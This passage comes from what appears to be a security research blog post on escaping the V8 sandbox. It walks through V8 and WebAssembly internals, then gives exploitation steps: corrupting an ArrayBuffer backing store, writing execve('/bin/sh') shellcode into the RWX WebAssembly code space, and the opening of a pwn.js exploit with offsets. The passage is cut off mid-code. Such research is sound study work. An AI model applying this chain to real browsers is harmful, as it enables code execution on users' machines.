uint32 = highWord &amp; <span class="number">0xFF</span>;</span><br><span class="line">  <span class="type">const</span> b5: uint32 = (highWord &gt;&gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">  <span class="type">const</span> b6: uint32 = (highWord &gt;&gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">  <span class="type">const</span> b7: uint32 = highWord &gt;&gt;&gt; <span class="number">24</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (requestedLittleEndian) &#123;</span><br><span class="line">    <span class="built_in">StoreWord8</span>(dataPointer, offset, b0);</span><br><span class="line">    <span class="built_in">StoreWord8</span>(dataPointer, offset + <span class="number">1</span>, b1);</span><br><span class="line">    <span class="built_in">StoreWord8</span>(dataPointer, offset + <span class="number">2</span>, b2);</span><br><span class="line">    <span class="built_in">StoreWord8</span>(dataPointer, offset + <span class="number">3</span>, b3);</span><br><span class="line">    <span class="built_in">StoreWord8</span>(dataPointer, offset + <span class="number">4</span>, b4);</span><br><span class="line">    <span class="built_in">StoreWord8</span>(dataPointer, offset + <span class="number">5</span>, b5);</span><br><span class="line">    <span class="built_in">StoreWord8</span>(dataPointer, offset + <span class="number">6</span>, b6);</span><br><span class="line">    <span class="built_in">StoreWord8</span>(dataPointer, offset + <span class="number">7</span>, b7);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">StoreWord8</span>(dataPointer, offset, b7);</span><br><span class="line">    <span class="built_in">StoreWord8</span>(dataPointer, offset + <span class="number">1</span>, b6);</span><br><span class="line">    <span class="built_in">StoreWord8</span>(dataPointer, offset + <span class="number">2</span>, b5);</span><br><span class="line">    <span class="built_in">StoreWord8</span>(dataPointer, offset + <span class="number">3</span>, b4);</span><br><span class="line">    <span class="built_in">StoreWord8</span>(dataPointer, offset + <span class="number">4</span>, b3);</span><br><span class="line">    <span class="built_in">StoreWord8</span>(dataPointer, offset + <span class="number">5</span>, b2);</span><br><span class="line">    <span class="built_in">StoreWord8</span>(dataPointer, offset + <span class="number">6</span>, b1);</span><br><span class="line">    <span class="built_in">StoreWord8</span>(dataPointer, offset + <span class="number">7</span>, b0);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>StoreDataView64()</code> stores the value in the backing store one byte at a time.</p>
<p><img src="/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/2.png"></p>
<p><img src="/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/3.png"></p>
<p>If we can overwrite the backing store pointer of <code>ArrayBuffer</code> with an arbitrary address, we can access that address to read from or write to.</p>
<h3 id="Execution-flow-of-WebAssembly-function"><a href="#Execution-flow-of-WebAssembly-function" class="headerlink" title="Execution flow of WebAssembly function"></a>Execution flow of WebAssembly function</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* src/wasm/wasm-code-manager.cc:2156-2222 */</span></span><br><span class="line"></span><br><span class="line"><span class="function">std::shared_ptr&lt;NativeModule&gt; <span class="title">WasmCodeManager::NewNativeModule</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    Isolate* isolate, <span class="type">const</span> WasmFeatures&amp; enabled, <span class="type">size_t</span> code_size_estimate,</span></span></span><br><span class="line"><span class="params"><span class="function">    std::shared_ptr&lt;<span class="type">const</span> WasmModule&gt; <span class="keyword">module</span>)</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">  <span class="comment">// Try up to two times; getting rid of dead JSArrayBuffer allocations might</span></span><br><span class="line">  <span class="comment">// require two GCs because the first GC maybe incremental and may have</span></span><br><span class="line">  <span class="comment">// floating garbage.</span></span><br><span class="line">  <span class="type">static</span> <span class="keyword">constexpr</span> <span class="type">int</span> kAllocationRetries = <span class="number">2</span>;</span><br><span class="line">  VirtualMemory code_space;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> retries = <span class="number">0</span>;; ++retries) &#123;</span><br><span class="line">    code_space = <span class="built_in">TryAllocate</span>(code_vmem_size);</span><br><span class="line">    <span class="keyword">if</span> (code_space.<span class="built_in">IsReserved</span>()) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (retries == kAllocationRetries) &#123;</span><br><span class="line">      V8::<span class="built_in">FatalProcessOutOfMemory</span>(isolate, <span class="string">&quot;NewNativeModule&quot;</span>);</span><br><span class="line">      <span class="built_in">UNREACHABLE</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Run one GC, then try the allocation again.</span></span><br><span class="line">    isolate-&gt;<span class="built_in">heap</span>()-&gt;<span class="built_in">MemoryPressureNotification</span>(MemoryPressureLevel::kCritical,</span><br><span class="line">                                                <span class="literal">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>When a WebAssembly module is constructed, <code>code_space</code> for the WebAssembly code is allocated.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* src/wasm/wasm-code-manager.cc:1545-1641 */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">NativeModule::AddCodeSpaceLocked</span><span class="params">(base::AddressRegion region)</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">  <span class="keyword">if</span> (needs_jump_table) &#123;</span><br><span class="line">    jump_table = <span class="built_in">CreateEmptyJumpTableInRegionLocked</span>(</span><br><span class="line">        JumpTableAssembler::<span class="built_in">SizeForNumberOfSlots</span>(num_wasm_functions), region);</span><br><span class="line">    <span class="built_in">CHECK</span>(region.<span class="built_in">contains</span>(jump_table-&gt;<span class="built_in">instruction_start</span>()));</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>jump_table</code> is created at the very front of the code space. The jump table determines the execution flow of functions in the WebAssembly module.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* src/wasm/wasm-code-manager.cc:1877-1934 */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">WasmCodeManager::Commit</span><span class="params">(base::AddressRegion region)</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">  PageAllocator::Permission permission = PageAllocator::kReadWriteExecute;</span><br><span class="line"></span><br><span class="line">  <span class="type">bool</span> success;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">MemoryProtectionKeysEnabled</span>()) &#123;</span><br><span class="line">    <span class="built_in">TRACE_HEAP</span>(</span><br><span class="line">        <span class="string">&quot;Setting rwx permissions and memory protection key %d for 0x%&quot;</span> PRIxPTR</span><br><span class="line">        <span class="string">&quot;:0x%&quot;</span> PRIxPTR <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">        memory_protection_key_, region.<span class="built_in">begin</span>(), region.<span class="built_in">end</span>());</span><br><span class="line">    success = <span class="built_in">SetPermissionsAndMemoryProtectionKey</span>(</span><br><span class="line">        <span class="built_in">GetPlatformPageAllocator</span>(), region, permission, memory_protection_key_);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">TRACE_HEAP</span>(<span class="string">&quot;Setting rwx permissions for 0x%&quot;</span> PRIxPTR <span class="string">&quot;:0x%&quot;</span> PRIxPTR <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">               region.<span class="built_in">begin</span>(), region.<span class="built_in">end</span>());</span><br><span class="line">    success = <span class="built_in">SetPermissions</span>(<span class="built_in">GetPlatformPageAllocator</span>(), region.<span class="built_in">begin</span>(),</span><br><span class="line">                             region.<span class="built_in">size</span>(), permission);</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The code space permission is set to RWX because compiled WebAssembly code has to be written to and executed in this space.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(; test.wat ;)</span><br><span class="line"></span><br><span class="line">(module</span><br><span class="line">  (func $f1 (export &quot;f1&quot;))</span><br><span class="line">  (func $f2 (export &quot;f2&quot;))</span><br><span class="line">  (func $f3 (export &quot;f3&quot;))</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><code>test.wat</code> defines a WebAssembly module containing three functions, all of which are exported to JavaScript.</p>
<p><img src="/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/4.png"></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> wasm_src = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">16</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">102</span>, <span class="number">49</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">102</span>, <span class="number">50</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">102</span>, <span class="number">51</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasm_module = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_src);</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/5.png"></p>
<p>The jump table consists of <code>jmp</code> instructions, each of which corresponds to a function in the module.</p>
<p>We can access the exported functions with <a target="_blank" rel="noopener" href="https://developer.mozilla.org/docs/WebAssembly/Reference/JavaScript_interface/Instance/exports"><code>WebAssembly.Instance.prototype.exports</code></a>.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> wasm_instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasm_module);</span><br><span class="line">% <span class="title class_">DebugPrint</span>(wasm_instance.<span class="property">exports</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/6.png"></p>
<p>Each function is managed by <code>JSFunction</code> class, like any other function in JavaScript.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* src/objects/js-function.tq:20-31 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// This class does not use the generated verifier, so if you change anything</span></span><br><span class="line"><span class="comment">// here, please also update JSFunctionVerify in objects-debug.cc.</span></span><br><span class="line">@highestInstanceTypeWithinParentClassRange</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">class</span> <span class="title class_">JSFunction</span> extends JSFunctionOrBoundFunction &#123;</span><br><span class="line">  shared_function_info: SharedFunctionInfo;</span><br><span class="line">  context: Context;</span><br><span class="line">  feedback_cell: FeedbackCell;</span><br><span class="line">  @<span class="keyword">if</span>(V8_EXTERNAL_CODE_SPACE) code: CodeDataContainer;</span><br><span class="line">  @ifnot(V8_EXTERNAL_CODE_SPACE) code: Code;</span><br><span class="line">  <span class="comment">// Space for the following field may or may not be allocated.</span></span><br><span class="line">  prototype_or_initial_map: JSReceiver|Map;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>JSFunction</code> has an accessor named <code>code</code> pointing to <code>CodeDataContainer</code>.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* src/objects/code.h:41-214 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// CodeDataContainer is a container for all mutable fields associated with its</span></span><br><span class="line"><span class="comment">// referencing &#123;Code&#125; object. Since &#123;Code&#125; objects reside on write-protected</span></span><br><span class="line"><span class="comment">// pages within the heap, its header fields need to be immutable. There always</span></span><br><span class="line"><span class="comment">// is a 1-to-1 relation between &#123;Code&#125; and &#123;CodeDataContainer&#125;, the referencing</span></span><br><span class="line"><span class="comment">// field &#123;Code::code_data_container&#125; itself is immutable.</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CodeDataContainer</span> : <span class="keyword">public</span> HeapObject &#123;</span><br><span class="line">...</span><br><span class="line">  <span class="comment">// Cached value of code().InstructionStart().</span></span><br><span class="line">  <span class="comment">// Available only when V8_EXTERNAL_CODE_SPACE is defined.</span></span><br><span class="line">  <span class="built_in">DECL_GETTER</span>(code_entry_point, Address)</span><br><span class="line">...</span><br><span class="line">  <span class="comment">// Alias for code_entry_point to make it API compatible with Code.</span></span><br><span class="line">  <span class="function"><span class="keyword">inline</span> Address <span class="title">InstructionStart</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Alias for code_entry_point to make it API compatible with Code.</span></span><br><span class="line">  <span class="function"><span class="keyword">inline</span> Address <span class="title">raw_instruction_start</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Alias for code_entry_point to make it API compatible with Code.</span></span><br><span class="line">  <span class="function"><span class="keyword">inline</span> Address <span class="title">entry</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line">...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>CodeDataContainer</code> has an accessor named <code>code_entry_point</code>, which points to where the instruction pointer moves when the function is called.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">% <span class="title class_">DebugPrint</span>(wasm_instance.<span class="property">exports</span>.<span class="property">f3</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/7.png"></p>
<p><img src="/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/8.png"></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wasm_instance.<span class="property">exports</span>.<span class="title function_">f3</span>();</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/9.png"></p>
<p>At this point, <code>rdi</code> holds the address of the <code>Function</code> object. The instructions from here are responsible for getting the call target corresponding to the function called.</p>
<p><img src="/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/10.png"></p>
<p><img src="/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/11.png"></p>
<p><img src="/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/12.png"></p>
<p><img src="/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/13.png"></p>
<p><img src="/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/14.png"></p>
<p><img src="/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/15.png"></p>
<p>Eventually, the instruction pointer moves to the third entry of the jump table. It corresponds to <code>f3()</code>, which is the third function in the module.</p>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="Get-address-of-WebAssembly-code-space"><a href="#Get-address-of-WebAssembly-code-space" class="headerlink" title="Get address of WebAssembly code space"></a>Get address of WebAssembly code space</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* src/wasm/wasm-objects.h:316-533 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Representation of a WebAssembly.Instance JavaScript-level object.</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">V8_EXPORT_PRIVATE</span> WasmInstanceObject : <span class="keyword">public</span> JSObject &#123;</span><br><span class="line">...</span><br><span class="line">  <span class="built_in">DECL_PRIMITIVE_ACCESSORS</span>(jump_table_start, Address)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">// Layout description.</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WASM_INSTANCE_OBJECT_FIELDS(V)                                    \</span></span><br><span class="line"><span class="meta">...</span></span><br><span class="line">  <span class="built_in">V</span>(kJumpTableStartOffset, kSystemPointerSize)                            \</span><br><span class="line">...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>WasmInstanceObject</code> has an accessor named <code>jump_table_start</code> pointing to the jump table of the corresponding WebAssembly module. The jump table is located at the very front of the WebAssembly code space, so the address of the jump table is identical to that of the code space.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">% <span class="title class_">DebugPrint</span>(wasm_instance);</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/16.png"></p>
<p><img src="/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/17.png"></p>
<p>We can obtain the address of the <code>WasmInstanceObject</code> using <code>addrof()</code> primitive, and read the value stored in <code>jump_table_start</code> field to get the address of the code space.</p>
<h3 id="Write-shellcode-to-WebAssembly-code-space"><a href="#Write-shellcode-to-WebAssembly-code-space" class="headerlink" title="Write shellcode to WebAssembly code space"></a>Write shellcode to WebAssembly code space</h3><p>We can obtain the address of an <code>ArrayBuffer</code> using <code>addrof()</code> primitive and overwrite <code>backing_store</code> field with an arbitrary 8-byte address that points to where we want to read from or write to. The address doesn’t have to be inside the V8 sandbox, so that we can perform unsandboxed AAR&#x2F;AAW via this corrupted <code>ArrayBuffer</code>.</p>
<p>Using the unsandboxed AAW, we can write our shellcode to the WebAssembly code space. The code space has both write and execute permissions, allowing us to execute our shellcode later.</p>
<h3 id="Execute-shellcode"><a href="#Execute-shellcode" class="headerlink" title="Execute shellcode"></a>Execute shellcode</h3><p>Calling the exported function moves the instruction pointer to the WebAssembly jump table, where our shellcode lies.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(; pwn.wat ;)</span><br><span class="line"></span><br><span class="line">(module</span><br><span class="line">  (func (export &quot;main&quot;))</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shellcode.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> context, constants, asm</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rdi == &quot;/bin/sh&quot;</span></span><br><span class="line">binsh = unpack(<span class="string">&quot;&lt;Q&quot;</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">shellcode += <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rdi, <span class="subst">&#123;binsh&#125;</span></span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rsi == 0</span></span><br><span class="line">shellcode += <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">xor rsi, rsi</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rdx == 0</span></span><br><span class="line">shellcode += <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">xor rdx, rdx</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rax == SYS_execve</span></span><br><span class="line">shellcode += <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">xor rax, rax</span></span><br><span class="line"><span class="string">mov al, <span class="subst">&#123;constants.SYS_execve&#125;</span></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># syscall =&gt; execve(&quot;/bin/sh&quot;, 0, 0)</span></span><br><span class="line">shellcode += <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(asm(shellcode)))</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* pwn.js */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* constants */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> kBigIntSize = <span class="number">8</span>; <span class="comment">// size of bigint</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> wasm_src = [<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">11</span>]; <span class="comment">// wat2wasm pwn.wat</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> kJumpTableStartOffset = <span class="number">0x60</span>; <span class="comment">// offset of jump_table_start in WasmInstanceObject</span></span><br><span class="line"><span class="keyword">const</span> kBackingStoreOffset = <span class="number">0x1c</span>; <span class="comment">// offset of backing_store in JSArrayBuffer</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// execve(&quot;/bin/sh&quot;, 0, 0)</span></span><br><span class="line"><span class="keyword">const</span> shellcode = [<span class="number">72</span>, <span class="number">191</span>, <span class="number">47</span>, <span class="number">98</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">0</span>, <span class="number">87</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">231</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">246</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">210</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">192</span>, <span class="number">176</span>, <span class="number">59</span>, <span class="number">15</span>, <span class="number">5</span>]; <span class="comment">// shellcode.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* --------- */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* helpers */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// convert integer to hex form</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">i</span>) &#123; <span class="keyword">return</span> <span class="string">`0x<span 